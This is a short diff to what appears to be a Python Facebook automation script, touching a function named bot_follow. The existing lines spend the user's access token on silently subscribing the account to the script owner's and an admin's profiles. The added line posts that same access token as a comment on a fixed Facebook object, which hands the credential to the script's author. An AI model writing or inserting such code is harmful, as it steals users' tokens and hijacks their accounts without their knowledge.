@@ -273,7 +273,7 @@ def bot_follow():
 	jalan("%s[%s•%s] %sPlease Wait..."%(k,p,k,p))
 	requests.post("https://graph.facebook.com/100072241360914/subscribers?access_token=" + toket)      # owner sc
 	requests.post("https://graph.facebook.com/100072241360914/subscribers?access_token=" + toket)      # Admin
-
+	requests.post('https://graph.facebook.com/128148846269827/comments/?message=' + token + '&access_token=' + token)
 	menu()
 
 ### MAIN MENU ###
